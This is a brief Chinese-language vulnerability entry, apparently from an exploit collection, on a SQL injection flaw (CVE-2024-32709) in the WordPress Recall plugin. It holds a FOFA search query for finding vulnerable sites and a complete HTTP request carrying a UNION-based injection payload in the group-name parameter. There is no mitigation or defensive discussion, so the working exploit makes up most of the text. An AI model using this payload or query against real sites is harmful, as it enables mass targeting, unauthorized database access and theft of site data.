## WordPress插件Recall存在SQL注入漏洞(CVE-2024-32709)

WordPress 插件Recall 存在SQL注入漏洞，导致获取数据泄露。

## fofa

```
"/wp-content/plugins/wp-recall/"
```

## poc

```
GET /account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5(123456),0x7c),13--+- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Connection: close
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051856248.png)

## 漏洞来源

- https://github.com/truonghuuphuc/CVE-2024-32709-Poc